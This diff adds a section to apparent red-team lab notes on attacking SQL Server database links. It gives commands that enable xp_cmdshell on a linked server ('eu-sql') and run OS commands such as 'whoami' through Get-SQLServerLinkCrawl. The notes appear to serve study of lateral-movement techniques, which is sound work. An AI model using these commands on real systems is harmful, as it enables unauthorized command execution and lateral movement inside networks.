@@ -43,5 +43,17 @@ __Enumerating Database Links - Recursively__
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
 ```
 
+__Execute Commands__
+- On the target server, either xp_cmdshell should be already enabled; or
+- If rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:
+```SQL
+EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
+```
+
+- Use the -QuertyTarget parameter to run Query on a specific instance (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain)
+
+```powershell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
+```
  
 
